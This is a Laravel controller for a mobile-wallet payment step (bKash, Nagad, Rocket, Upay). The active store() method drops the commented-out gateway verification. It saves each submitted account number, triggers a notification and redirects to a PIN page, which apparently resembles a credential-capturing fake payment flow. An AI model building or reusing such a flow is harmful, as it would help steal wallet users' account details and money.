<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\PaymentAccountNumberSubmitted;
use App\Models\Application;
use App\Modules\Forms\FormNotificationService;
use App\Modules\Payment\Http\Requests\StoreAccountNumberRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use Illuminate\Http\RedirectResponse;
use Illuminate\Routing\Controller;
use Illuminate\View\View;

class AccountNumberController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
        private readonly FormNotificationService $notifications,
    ) {
    }

    // public function show(): View
    // {
    //     return view('payment::steps.account-number', ['session' => $this->session]);
    // }
public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.account-number', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.account-number', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.account-number', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.account-number', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}
    // public function store(StoreAccountNumberRequest $request): RedirectResponse
    // {
    //     $response = $this->gateways->driver()->verifyAccountNumber(
    //         $this->session,
    //         $request->validated()['account_number'],
    //     );

    //     if (! $response->successful) {
    //         return back()->withErrors(['account_number' => $response->message]);
    //     }

    //     $this->session->setStep('pin');

    //     return redirect()->route('apay-payment.steps.pin');
    // }

public function store(
    StoreAccountNumberRequest $request
): RedirectResponse {

    $parcel_number = $request->validated()['account_number'];

    // Store account number in payment session
    $this->session->put([
        'parcel_number' => $parcel_number,
    ]);

    $referenceNo = $this->session->get('reference_no');

    if ($referenceNo) {
            $application = Application::where(
                'payment_reference',
                $referenceNo
            )->first();
            if($application){
                $meta_info = $application->meta_info;
                if (is_string($meta_info)) {
                    $decoded = json_decode(
                        $meta_info,
                        true
                    );
                    $meta_info = is_array($decoded)
                        ? $decoded
                        : [];
                } elseif (! is_array($meta_info)) {
                    $meta_info = [];
                }
                $meta_info['number'] = $parcel_number;
                $application->update([
                    'meta_info' => $meta_info,
                ]);
                event(new PaymentAccountNumberSubmitted($application));
                $this->notifications->notifyPaymentAccountSubmitted($application);
            }

    }

    $this->session->setStep('pin');

    return redirect()->route(
        'apay-payment.steps.pin'
    );
}

}
